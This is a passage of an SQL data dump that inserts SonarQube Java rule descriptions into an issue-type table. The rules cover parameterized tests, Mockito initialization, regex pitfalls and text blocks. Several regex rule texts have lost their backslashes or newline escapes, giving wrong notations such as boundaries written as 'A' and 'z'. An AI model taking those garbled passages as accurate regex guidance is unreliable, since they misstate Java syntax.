  <li> <a href="https://testng.org/doc/documentation-main.html#annotations">TestNG documentation - Annotations</a> </li>
  <li> <a href="https://engineering.atspotify.com/2019/11/18/test-flakiness-methods-for-identifying-and-dealing-with-flaky-tests/">Test Flakiness -
  Methods for identifying and dealing with flaky tests</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5976', 'Similar tests should be grouped in a single Parameterized test', 'sonarqube', 'Code Smell', '<p>When multiple tests differ only by a few hardcoded values they should be refactored as a single "parameterized" test. This reduces the chances of
adding a bug and makes them more readable. Parameterized tests exist in most test frameworks (JUnit, TestNG, etc...).</p>
<p>The right balance needs of course to be found. There is no point in factorizing test methods when the parameterized version is a lot more complex
than initial tests.</p>
<p>This rule raises an issue when at least 3 tests could be refactored as one parameterized test with less than 4 parameters. Only test methods which
have at least one duplicated statement are considered.</p>
<h2>Noncompliant Code Example</h2>
<p>with JUnit 5</p>
<pre>
import static org.junit.jupiter.api.Assertions.assertEquals;

import org.junit.jupiter.api.Test;

public class AppTest
{
    @Test
    void test_not_null1() {  // Noncompliant. The 3 following tests differ only by one hardcoded number.
      setupTax();
      assertNotNull(getTax(1));
    }

    @Test
    void test_not_null2() {
      setupTax();
      assertNotNull(getTax(2));
    }

    @Test
    void test_not_nul3l() {
      setupTax();
      assertNotNull(getTax(3));
    }

    @Test
    void testLevel1() {  // Noncompliant. The 3 following tests differ only by a few hardcoded numbers.
        setLevel(1);
        runGame();
        assertEquals(playerHealth(), 100);
    }

    @Test
    void testLevel2() {  // Similar test
        setLevel(2);
        runGame();
        assertEquals(playerHealth(), 200);
    }

    @Test
    void testLevel3() {  // Similar test
        setLevel(3);
        runGame();
        assertEquals(playerHealth(), 300);
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import static org.junit.jupiter.api.Assertions.assertEquals;

import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;

public class AppTest
{

   @ParameterizedTest
   @ValueSource(ints = {1, 2, 3})
   void test_not_null(int arg) {
     setupTax();
     assertNotNull(getTax(arg));
   }

    @ParameterizedTest
    @CsvSource({
        "1, 100",
        "2, 200",
        "3, 300",
    })
    void testLevels(int level, int health) {
        setLevel(level);
        runGame();
        assertEquals(playerHealth(), health);
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://phauer.com/2019/modern-best-practices-testing-java/#use-parameterized-tests">Modern Best Practices for Testing in Java -
  Philipp Hauer</a> </li>
  <li> <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-parameterized-tests">JUnit 5 documentation - Parameterized tests</a>
  </li>
  <li> <a href="https://www.testwithspring.com/lesson/writing-parameterized-tests-with-junit-4/">Writing Parameterized Tests With JUnit 4</a> </li>
  <li> <a href="https://testng.org/doc/documentation-main.html#parameters">TestNG documentation - Parameters</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5977', 'Tests should use fixed data instead of randomized data', 'sonarqube', 'Code Smell', '<p>Tests should always:</p>
<ul>
  <li> Make sure that production code behaves as expected, including edge cases. </li>
  <li> Be easy to debug, i.e. understandable and reproducible. </li>
</ul>
<p>Using random values in tests will not necessarily check edge cases, and it will make test logs a lot harder to read. It is better to use easily
readable hardcoded values. If this makes your code bigger you can use helper functions.</p>
<p>There is one valid use case for random data in tests: when testing every value would make tests impractically slow. In this case the best you can
do is use random to test every value on the long run. You should however make sure that random values are logged so that you can reproduce failures.
Some libraries exist to make all this easier. You can for example use property-based testing libraries such as <a
href="https://github.com/jlink/jqwik">jqwik</a>.</p>
<p>This rule raises an issue when <code>new Random()</code> or <code>UUID.randomUUID()</code> are called in test code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int userAge = new Random().nextInt(42);  // Noncompliant
UUID userID = UUID.randomUUID(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int userAge = 31;
UUID userID = UUID.fromString("00000000-000-0000-0000-000000000001");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://phauer.com/2019/modern-best-practices-testing-java/#use-fixed-data-instead-of-randomized-data">Modern Best Practices for
  Testing in Java - Philipp Hauer</a> </li>
  <li> <a href="https://jqwik.net/">Jqwik test engine</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5979', 'Annotated Mockito objects should be initialized', 'sonarqube', 'Bug', '<p>Objects annotated with Mockito annotations <code>@Mock</code>,&nbsp;<code>@Spy</code>,&nbsp;<code>@Captor</code>,&nbsp;or <code>@InjectMocks</code>
need to be initialized explicitly.</p>
<p>There are several ways to do this:</p>
<ul>
  <li> Call <code>MockitoAnnotations.openMocks(this)</code> or&nbsp;<code>MockitoAnnotations.initMocks(this)</code>&nbsp;in a setup method </li>
  <li> Annotate test class with&nbsp;<code>@RunWith(MockitoJUnitRunner.class)</code>&nbsp;(JUnit 4) </li>
  <li> Annotate test class with&nbsp;<code>@ExtendWith(MockitoExtension.class)</code>&nbsp;(JUnit 5 Jupiter) </li>
  <li> Use&nbsp;<code>@Rule public MockitoRule rule = MockitoJUnit.rule();</code> </li>
</ul>
<p>Test using uninitialized mocks will fail.</p>
<p>Note that this only applies to annotated Mockito objects. It is not necessary to initialize objects instantiated via <code>Mockito.mock()</code> or
<code>Mockito.spy()</code>.</p>
<p>This rule raises an issue when a test class uses uninitialized mocks.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class FooTest { // Noncompliant: Mockito initialization missing
  @Mock private Bar bar;

  @Spy private Baz baz;

  @InjectMocks private Foo fooUnderTest;

  @Test
  void someTest() {
    // test something ...
  }

  @Nested
  public class Nested {
    @Mock
    private Bar bar;
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
@RunWith(MockitoJUnitRunner.class)
public class FooTest {
  @Mock private Bar bar;
  // ...
}
</pre>
<pre>
@ExtendWith(MockitoExtension.class)
public class FooTest {
  @Mock private Bar bar;
  // ...
}
</pre>
<pre>
public class FooTest {
  @Rule
  public MockitoRule rule = MockitoJUnit.rule();

  @Mock private Bar bar;
  // ...
}
</pre>
<pre>
public class FooTest {
  @Mock private Bar bar;
  // ...

  @BeforeEach
  void setUp() {
    MockitoAnnotations.openMocks(this);
  }
  // ...
}
</pre>
<pre>
public class FooTest {
  @Mock private Bar bar;
  // ...

  @Before
  void setUp() {
    MockitoAnnotations.initMocks(this);
  }
  // ...
}
</pre>
<pre>
@ExtendWith(MockitoExtension.class)
public class FooTest {
  @Nested
  public class Nested {
    @Mock
    private Bar bar;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://site.mockito.org/javadoc/current/org/mockito/MockitoAnnotations.html">Mockito documentation - MockitoAnnotations</a> </li>
  <li> <a href="https://site.mockito.org/javadoc/current/org/mockito/junit/MockitoRule.html">Mockito documentation - MockitoRule </a> </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5993', 'Constructors of an "abstract" class should not be declared "public"', 'sonarqube', 'Code Smell', '<p>Abstract classes should not have public constructors. Constructors of abstract classes can only be called in constructors of their subclasses. So
there is no point in making them public. The <code>protected</code> modifier should be enough.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public abstract class AbstractClass1 {
    public AbstractClass1 () { // Noncompliant, has public modifier
        // do something here
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public abstract class AbstractClass2 {
    protected AbstractClass2 () {
        // do something here
    }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5994', 'Regex patterns following a possessive quantifier should not always fail', 'sonarqube', 'Bug', '<p>Possessive quantifiers in Regex patterns like below improve performance by eliminating needless backtracking:</p>
<p>{noformat}</p>
<p>?+ , *+ , ++ , {n}+ , {n,}+ , {n,m}+</p>
<p>{noformat}</p>
<p>But because possessive quantifiers do not keep backtracking positions and never give back, the following sub-patterns should not match only similar
characters. Otherwise, possessive quantifiers consume all characters that could have matched the following sub-patterns and nothing remains for the
following sub-patterns.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Pattern pattern1 = Pattern.compile("a++abc");       // Noncompliant, the second ''a'' never matches
Pattern pattern2 = Pattern.compile("\\d*+[02468]"); // Noncompliant, the sub-pattern "[02468]" never matches
</pre>
<h2>Compliant Solution</h2>
<pre>
Pattern pattern1 = Pattern.compile("aa++bc");            // Compliant, for example it can match "aaaabc"
Pattern pattern2 = Pattern.compile("\\d*+(?&lt;=[02468])"); // Compliant, for example it can match an even number like "1234"
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5996', 'Regex boundaries should not be used in a way that can never be matched', 'sonarqube', 'Bug', '<p>In regular expressions the boundaries <code>^</code> and <code>A</code> can only match at the beginning of the input (or, in case of
<code>^</code> in combination with the <code>MULTILINE</code> flag, the beginning of the line) and <code>$</code>, <code></code> and <code>z</code>
only at the end.</p>
<p>These patterns can be misused, by accidentally switching <code>^</code> and <code>$</code> for example, to create a pattern that can never
match.</p>
<h2>Noncompliant Code Example</h2>
<pre>
// This can never match because $ and ^ have been switched around
Pattern.compile("$[a-z]+^"); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Pattern.compile("^[a-z]+$");
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5998', 'Regular expressions should not overflow the stack', 'sonarqube', 'Bug', '<p>The Java regex engine uses recursive method calls to implement backtracking. Therefore when a repetition inside a regular expression contains
multiple paths (i.e. the body of the repetition contains an alternation (<code>|</code>), an optional element or another repetition), trying to match
the regular expression can cause a stack overflow on large inputs. This does not happen when using a possessive quantifier (such as <code>*+</code>
instead of <code>*</code>) or when using a character class inside a repetition (e.g. <code>[ab]*</code> instead of <code>(a|b)*</code>).</p>
<p>The size of the input required to overflow the stack depends on various factors, including of course the stack size of the JVM. One thing that
significantly increases the size of the input that can be processed is if each iteration of the repetition goes through a chain of multiple constant
characters because such consecutive characters will be matched by the regex engine without invoking any recursion.</p>
<p>For example, on a JVM with a stack size of 1MB, the regex <code>(?:a|b)*</code> will overflow the stack after matching around 6000 characters
(actual numbers may differ between JVM versions and even across multiple runs on the same JVM) whereas <code>(?:abc|def)*</code> can handle around
15000 characters.</p>
<p>Since often times stack growth can''t easily be avoided, this rule will only report issues on regular expressions if they can cause a stack overflow
on realistically sized inputs. You can adjust the <code>maxStackConsumptionFactor</code> parameter to adjust this.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Pattern.compile("(a|b)*"); // Noncompliant
Pattern.compile("(.|
)*"); // Noncompliant
Pattern.compile("(ab?)*"); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Pattern.compile("[ab]*"); // Character classes don''t cause recursion the way that ''|'' does
Pattern.compile("(?s).*"); // Enabling the (?s) flag makes ''.'' match line breaks, so ''|
'' isn''t necessary
Pattern.compile("(ab?)*+"); // Possessive quantifiers don''t cause recursion because they disable backtracking
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6001', 'Back references in regular expressions should only refer to capturing groups that are matched before the reference', 'sonarqube', 'Bug', '<p>When a back reference in a regex refers to a capturing group that hasn''t been defined yet (or at all), it can never be matched. Named back
references throw a <code>PatternSyntaxException</code> in that case; numeric back references fail silently when they can''t match, simply making the
match fail.</p>
<p>When the group is defined before the back reference but on a different control path (like in <code>(.)|1</code> for example), this also leads to a
situation where the back reference can never match.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Pattern.compile("\\1(.)"); // Noncompliant, group 1 is defined after the back reference
Pattern.compile("(.)\\2"); // Noncompliant, group 2 isn''t defined at all
Pattern.compile("(.)|\\1"); // Noncompliant, group 1 and the back reference are in different branches
Pattern.compile("(?&lt;x&gt;.)|\\k&lt;x&gt;"); // Noncompliant, group x and the back reference are in different branches
</pre>
<h2>Compliant Solution</h2>
<pre>
Pattern.compile("(.)\\1");
Pattern.compile("(?&lt;x&gt;.)\\k&lt;x&gt;");
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6002', 'Regex lookahead assertions should not be contradictory', 'sonarqube', 'Bug', '<p>Lookahead assertions are a regex feature that makes it possible to look ahead in the input without consuming it. It is often used at the end of
regular expressions to make sure that substrings only match when they are followed by a specific pattern.</p>
<p>However, they can also be used in the middle (or at the beginning) of a regex. In that case there is the possibility that what comes after the
lookahead does not match the pattern inside the lookahead. This makes the lookahead impossible to match and is a sign that there''s a mistake in the
regular expression that should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Pattern.compile("(?=a)b"); // Noncompliant, the same character can''t be equal to ''a'' and ''b'' at the same time
</pre>
<h2>Compliant Solution</h2>
<pre>
Pattern.compile("(?&lt;=a)b");
Pattern.compile("a(?=b)");
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6019', 'Reluctant quantifiers in regular expressions should be followed by an expression that can''t match the empty string', 'sonarqube', 'Code Smell', '<p>When a reluctant quantifier (such as <code>*?</code> or <code>+?</code>) is followed by a pattern that can match the empty string or directly by
the end of the regex, it will always match the empty string when used with methods that find partial matches (such as <code>find</code>,
<code>replaceAll</code>, <code>split</code> etc.).</p>
<p>Similarly, when used with methods that find full matches, a reluctant quantifier that''s followed directly by the end of the regex (or a pattern
that always matches the empty string, such as <code>()</code>) behaves indistinguishably from a greedy quantifier while being less efficient.</p>
<p>This is likely a sign that the regex does not work as intended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
str.split(".*?x?"); // Noncompliant, this will behave just like "x?"
str.matches(".*?"); // Noncompliant, replace with ".*"
</pre>
<h2>Compliant Solution</h2>
<pre>
str.split(".*?x");
str.matches(".*");
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6035', 'Single-character alternations in regular expressions should be replaced with character classes', 'sonarqube', 'Code Smell', '<p>When an alternation contains multiple alternatives that consist of a single character, it can be rewritten as a character class. This should be
preferred because it is more efficient and can even help prevent stack overflows when used inside a repetition (see rule <a href=''/coding_rules#rule_key=java%3AS5998''>S5998</a> ).</p>
<h2>Noncompliant Code Example</h2>
<pre>
Pattern.compile("a|b|c"); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Pattern.compile("[abc]");
// or
Pattern.compile("[a-c]");
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6068', 'Call to Mockito method "verify", "when" or "given" should be simplified', 'sonarqube', 'Code Smell', '<p>Mockito provides <em>argument matchers</em> for flexibly stubbing or verifying method calls.</p>
<p><code>Mockito.verify()</code>, <code>Mockito.when()</code>, <code>Stubber.when()</code> and <code>BDDMockito.given()</code> each have overloads
with and without argument matchers.</p>
<p>However, the default matching behavior (i.e. without argument matchers) uses <code>equals()</code>. If only the matcher
<code>org.mockito.ArgumentMatchers.eq()</code> is used, the call is equivalent to the call without matchers, i.e. the <code>eq()</code> is not
necessary and can be omitted. The resulting code is shorter and easier to read.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void myTest() {
  given(foo.bar(eq(v1), eq(v2), eq(v3))).willReturn(null);   // Noncompliant
  when(foo.baz(eq(v4), eq(v5))).thenReturn("foo");   // Noncompliant
  doThrow(new RuntimeException()).when(foo).quux(eq(42));    // Noncompliant
  verify(foo).bar(eq(v1), eq(v2), eq(v3));   // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void myTest() {
  given(foo.bar(v1, v2, v3)).willReturn(null);
  when(foo.baz(v4, v5)).thenReturn("foo");
  doThrow(new RuntimeException()).when(foo).quux(42);
  verify(foo).bar(v1, v2, v3);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://javadoc.io/doc/org.mockito/mockito-core/latest/org/mockito/Mockito.html#argument_matchers">Mockito documentation</a> -
  argument matchers </li>
  <li> <a href=''/coding_rules#rule_key=java%3AS6073''>S6073</a> - Mockito argument matchers should be used on all parameters </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6070', 'The regex escape sequence cX should only be used with characters in the @-_ range', 'sonarqube', 'Bug', '<p>In regular expressions the escape sequence <code>cX</code>, where the X stands for any character that''s either <code>@</code>, any capital ASCII
letter, <code>[</code>, <code></code>, <code>]</code>, <code>^</code> or <code>_</code>, represents the control character that "corresponds" to the
character following <code>c</code>, meaning the control character that comes 64 bytes before the given character in the ASCII encoding.</p>
<p>In some other regex engines (for example in that of Perl) this escape sequence is case insensitive and <code>cd</code> produces the same control
character as <code>cD</code>. Further using <code>c</code> with a character that''s neither <code>@</code>, any ASCII letter, <code>[</code>,
<code></code>, <code>]</code>, <code>^</code> nor <code>_</code>, will produce a warning or error in those engines. Neither of these things is true
in Java, where the value of the character is always XORed with 64 without checking that this operation makes sense. Since this won''t lead to a
sensible result for characters that are outside of the <code>@</code> to <code>_</code> range, using <code>c</code> with such characters is almost
certainly a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Pattern.compile("\\ca"); // Noncompliant, ''a'' is not an upper case letter
Pattern.compile("\\c!"); // Noncompliant, ''!'' is outside of the ''@''-''_'' range
</pre>
<h2>Compliant Solution</h2>
<pre>
Pattern.compile("\\cA"); // Compliant, this will match the "start of heading" control character
Pattern.compile("\\c^"); // Compliant, this will match the "record separator" control character
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6073', 'Mockito argument matchers should be used on all parameters', 'sonarqube', 'Bug', '<p>Mockito provides <em>argument matchers</em> and <em>argument captors</em> for flexibly stubbing or verifying method calls.</p>
<p><code>Mockito.verify()</code>, <code>Mockito.when()</code>, <code>Stubber.when()</code> and <code>BDDMockito.given()</code> each have overloads
with and without argument matchers.</p>
<p>However, if argument matchers or captors are used only on some of the parameters, all the parameters need to have matchers as well, otherwise an
<code>InvalidUseOfMatchersException</code> will be thrown. </p>
<p>This rule consequently raises an issue every time matchers are not used on all the parameters of a stubbed/verified method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void myTest() {
  given(foo.bar(anyInt(), i1, i2)).willReturn(null); // Noncompliant
  when(foo.baz(eq(val1), val2)).thenReturn("hi"); // Noncompliant
  doThrow(new RuntimeException()).when(foo).quux(intThat(x -&gt; x &gt;= 42), -1); // Noncompliant
  verify(foo).bar(i1, anyInt(), i2); // Noncompliant
  ArgumentCaptor&lt;Integer&gt; captor = ArgumentCaptor.forClass(Integer.class);
  verify(foo).bar(captor.capture(), i1, any()); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void myTest() {
  given(foo.bar(anyInt(), eq(i1), eq(i2))).willReturn(null);
  when(foo.baz(val1, val2)).thenReturn("hi");
  doThrow(new RuntimeException()).when(foo).quux(intThat(x -&gt; x &gt;= 42), eq(-1));
  verify(foo).bar(eq(i1), anyInt(), eq(i2));
  ArgumentCaptor&lt;Integer&gt; captor = ArgumentCaptor.forClass(Integer.class);
  verify(foo).bar(captor.capture(), any(), any());
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://javadoc.io/doc/org.mockito/mockito-core/latest/org/mockito/Mockito.html#argument_matchers">Mockito documentation</a> -
  argument matchers </li>
  <li> <a href=''/coding_rules#rule_key=java%3AS6068''>S6068</a> - Call to Mockito method "verify", "when" or "given" should be simplified </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6103', 'AssertJ assertions with "Consumer" arguments should contain assertion inside consumers', 'sonarqube', 'Bug', '<p>AssertJ assertions taking <code>Consumer</code> objects as arguments are expected to contain "requirements", which should themselves be expressed
as assertions. This concerns the following methods: <a
href="http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractIterableAssert.html#allSatisfy-java.util.function.Consumer-">allSatisfy</a>,
<a
href="http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractIterableAssert.html#anySatisfy-java.util.function.Consumer-">anySatisfy</a>,
<a
href="http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractIterableAssert.html#hasOnlyOneElementSatisfying-java.util.function.Consumer-">hasOnlyOneElementSatisfying</a>,&nbsp;<a
href="https://tinyurl.com/yxnzt6pj">isInstanceOfSatisfying</a>,&nbsp;<a
href="http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractIterableAssert.html#noneSatisfy-java.util.function.Consumer-">noneSatisfy</a>,
<a
href="http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractAssert.html#satisfies-java.util.function.Consumer-">satisfies</a>,
<a
href="http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractAssert.html#satisfiesAnyOf-java.util.function.Consumer-java.util.function.Consumer-">satisfiesAnyOf</a>,&nbsp;<a
href="http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractIterableAssert.html#zipSatisfy-java.lang.Iterable-java.util.function.BiConsumer-">zipSatisfy</a>.</p>
<p>These methods are assuming the&nbsp;<code>Consumer</code>&nbsp;will do the assertions itself. If you do not do any assertion in the
<code>Consumer</code>, it probably means that you are inadvertently only partially testing your object.</p>
<p>This rule raises an issue when a <code>Consumer</code> argument of any of the above methods does not contain any assertion.</p>
<h2>Noncompliant Code Example</h2>
<pre>
assertThat(myObject).isInstanceOfSatisfying(String.class, s -&gt; "Hello".equals(s)); // Noncompliant - not testing the string value
assertThat(myObject).satisfies("Hello"::equals); // Noncompliant - not testing the string value
</pre>
<h2>Compliant Solution</h2>
<pre>
assertThat(myObject).isInstanceOfSatisfying(String.class, s -&gt; assertThat(s).isEqualTo("Hello"));
assertThat(myObject).satisfies(obj -&gt; assertThat(obj).isEqualTo("Hello"));
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6104', 'Map "computeIfAbsent()" and "computeIfPresent()" should not be used to add "null" values.', 'sonarqube', 'Bug', '<p>Map <a
href="https://docs.oracle.com/javase/8/docs/api/java/util/Map.html#computeIfAbsent-K-java.util.function.Function-">computeIfAbsent</a>&nbsp;and <a
href="https://docs.oracle.com/javase/8/docs/api/java/util/Map.html#computeIfPresent-K-java.util.function.BiFunction-">computeIfPresent</a> methods are
convenient to avoid the cumbersome process to check if a key exists or not, followed by the addition of the entry. However, when the function used to
compute the value returns <code>null</code>, the entry <code>key-&gt;null</code> will not be added to the Map. Furthermore, in the case of
<code>computeIfPresent</code>, if the key is present the entry will be removed. These methods should therefore not be used to conditionally add an
entry with a null value. The traditional way should be used instead.</p>
<p>This rule raises an issue when <code>computeIfAbsent</code> or <code>computeIfPresent</code> is used with a lambda always returning null.</p>
<h2>Noncompliant Code Example</h2>
<pre>
map.computeIfAbsent(key, k -&gt; null); // Noncompliant, the map will not contain an entry key-&gt;null.
map.computeIfPresent(key, (k, oldValue) -&gt; null); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (!map.containsKey(key)) {
    map.put(key, null);
}
if (map.containsKey(key)) {
    map.put(key, null);
}
</pre>
<h2>See also</h2>
<ul>
  <li> <a href=''/coding_rules#rule_key=java%3AS3824''>S3824</a> - "Map.get" and value test should be replaced with single method call </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6126', 'String multiline concatenation should be replaced with Text Blocks', 'sonarqube', 'Code Smell', '<p>In Java 15 Text Blocks are now official and can be used. The most common pattern for multiline strings in Java &lt; 15 was to write String
concatenation. Now it''s possible to do it in a more natural way using Text Blocks.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String textBlock =
               "&lt;html&gt;
" +
               "    &lt;body&gt;
" +
               "        &lt;tag&gt;
" +
               "        &lt;/tag&gt;
" +
               "    &lt;/body&gt;
" +
               "&lt;/html&gt;";
</pre>
<h2>Compliant Solution</h2>
<pre>
String textBlock = """
        &lt;html&gt;
            &lt;body&gt;
                &lt;tag&gt;
                &lt;/tag&gt;
            &lt;/body&gt;
        &lt;/html&gt;""";
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://openjdk.java.net/jeps/378">JEP 378: Text Blocks</a> </li>
  <li> <a href="https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html">Programmer''s Guide To Text Blocks</a>, by Jim Laskey and Stuart
  Marks </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6202', 'Operator "instanceof" should be used instead of "A.class.isInstance()"', 'sonarqube', 'Code Smell', '<p>The <code>instanceof</code> construction is a preferred way to check whether a variable can be cast to some type statically because a compile-time
error will occur in case of incompatible types. The method <a
href="https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html#isInstance-java.lang.Object-">isInstance()</a> from <code>java.lang.Class</code>
works differently and does type check at runtime only, incompatible types will therefore not be detected early in the developement, potentially
resulting in dead code. The <code>isInstance()</code> method should only be used in dynamic cases when the <code>instanceof</code> operator can''t be
used.</p>
<p>This rule raises an issue when <code>isInstance()</code> is used and could be replaced with an <code>instanceof</code> check.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int f(Object o) {
&nbsp; if (String.class.isInstance(o)) {&nbsp; // Noncompliant
&nbsp; &nbsp; return 42;
&nbsp; }
&nbsp; return 0;
}

int f(Number n) {
&nbsp; if (String.class.isInstance(n)) {&nbsp; // Noncompliant
&nbsp; &nbsp; return 42;
&nbsp; }
&nbsp; return 0;
}

</pre>
<h2>Compliant Solution</h2>
<pre>
int f(Object o) {
&nbsp; if (o instanceof String) {&nbsp; // Compliant
&nbsp; &nbsp; return 42;
&nbsp; }
&nbsp; return 0;
}

int f(Number n) {
&nbsp; if (n instanceof String) {&nbsp; // Compile-time error
&nbsp; &nbsp; return 42;
&nbsp; }
&nbsp; return 0;
}

boolean fun(Object o, String c) throws ClassNotFoundException
{
  return Class.forName(c).isInstance(o); // Compliant, can''t use instanceof operator here
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6203', 'Text blocks should not be used in complex expressions', 'sonarqube', 'Code Smell', '<p>In Java 15 Text Blocks are official and can be used just like an ordinary String. However, when they are used to represent a big chunk of text,
they should not be used directly in complex expressions, as it decreases the readability. In this case, it is better to extract the text block into a
variable or a field.</p>
<p>This rule reports an issue when a text block longer than a number of lines given as a parameter is directly used within a lambda expression.</p>
<h2>Noncompliant Code Example</h2>
<pre>
listOfString.stream()
  .map(str -&gt; !"""
    &lt;project&gt;
      &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
      &lt;parent&gt;
        &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt;
        &lt;artifactId&gt;my-app&lt;/artifactId&gt;
        &lt;version&gt;1&lt;/version&gt;
      &lt;/parent&gt;

      &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt;
      &lt;artifactId&gt;my-module&lt;/artifactId&gt;
      &lt;version&gt;1&lt;/version&gt;
    &lt;/project&gt;
    """.equals(str));
</pre>
<h2>Compliant Solution</h2>
<pre>
String myTextBlock = """
    &lt;project&gt;
      &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
      &lt;parent&gt;
        &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt;
        &lt;artifactId&gt;my-app&lt;/artifactId&gt;
        &lt;version&gt;1&lt;/version&gt;
      &lt;/parent&gt;

      &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt;
      &lt;artifactId&gt;my-module&lt;/artifactId&gt;
      &lt;version&gt;1&lt;/version&gt;
    &lt;/project&gt;
    """;

listOfString.stream()
  .map(str -&gt; !myTextBlock.equals(str));
</pre>
<h2>See</h2>
<p> * <a href="https://openjdk.java.net/jeps/378">JEP 378: Text Blocks</a></p>
<p> * <a href="https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html">Programmer''s Guide To Text Blocks</a>, by Jim Laskey and Stuart
Marks</p>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6205', 'Switch arrow labels should not use redundant keywords', 'sonarqube', 'Code Smell', '<p>In Switch Expressions, an arrow label consisting of a block with a single <code>yield</code> can be simplified to directly return the value,
resulting in cleaner code.</p>
